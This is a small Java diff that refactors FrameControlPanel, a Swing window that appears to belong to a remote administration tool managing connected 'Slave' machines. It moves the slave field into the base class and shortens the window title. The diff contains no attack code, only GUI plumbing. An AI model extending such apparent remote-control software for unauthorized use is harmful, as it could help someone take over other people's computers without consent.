@@ -90,8 +90,6 @@ import com.redpois0n.oslib.OperatingSystem;
 @SuppressWarnings({ "serial" })
 public class FrameControlPanel extends BaseFrame {
 
-	public Slave slave;
-
 	private JPanel contentPane;
 	private JPanel panel;
 	private JTree tree;
@@ -126,8 +124,8 @@ public class FrameControlPanel extends BaseFrame {
 		}
 	}
 
-	public FrameControlPanel(final Slave slave) {
-		super();
+	public FrameControlPanel(Slave s) {
+		super(s);
 		loadItems();
 		super.addWindowListener(new WindowAdapter() {
 			@Override
@@ -150,8 +148,7 @@ public class FrameControlPanel extends BaseFrame {
 			}
 		});
 		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameControlPanel.class.getResource("/icons/controlpanel.png")));
-		setTitle("Control Panel - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
-		this.slave = slave;
+		setTitle("Control Panel");
 		final Slave sl = slave;
 		instances.put(slave, this);
 
